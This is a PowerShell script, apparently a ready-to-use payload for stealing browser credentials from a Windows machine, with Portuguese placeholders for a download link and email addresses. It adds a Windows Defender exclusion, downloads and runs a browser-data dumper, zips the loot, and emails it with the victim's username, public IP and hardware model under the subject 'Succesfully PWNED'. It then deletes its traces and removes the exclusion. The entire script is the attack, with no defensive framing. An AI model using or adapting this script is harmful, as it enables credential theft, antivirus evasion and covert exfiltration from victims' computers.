#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:appdata"
#Creating the directory we will work on
mkdir "$env:appdata\Local\dump"
Set-Location "$env:appdata\Local\dump"
#Downloading and executing hackbrowser.exe
Invoke-WebRequest -Uri "link do seu hackbrowser.exe (pd pegar o link raw do hb no repositorio)" -OutFile "$env:appdata\Local\dump\hb.exe"
cd $env:appdata\Local\dump\ 
./hb.exe
Remove-Item -Path "$env:appdata\Local\dump\hb.exe" -Force
#Creating A Zip Archive
Compress-Archive -Path * -DestinationPath dump.zip
$Random = Get-Random
#Mailing the output you will need to enable less secure app access on your google account for this to work
$Message = new-object Net.Mail.MailMessage
$smtp = new-object Net.Mail.SmtpClient("smtp.office365.com", 587)
$smtp.Credentials = New-Object System.Net.NetworkCredential("seu email de envio", "senha");
$smtp.EnableSsl = $true
$Message.From = "email de envio"
$Message.To.Add("email de recibimento")
$ip = Invoke-RestMethod "myexternalip.com/raw"
$Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
$Message.Body = $ComputerName
$files=Get-ChildItem 
$Message.Attachments.Add("$env:appdata\Local\dump\dump.zip")
$smtp.Send($Message)
$Message.Dispose()
$smtp.Dispose()
#Cleanup
cd "$env:appdata"
Remove-Item -Path "$env:appdata\Local\dump" -Force -Recurse
Remove-MpPreference -ExclusionPath "$env:appdata"


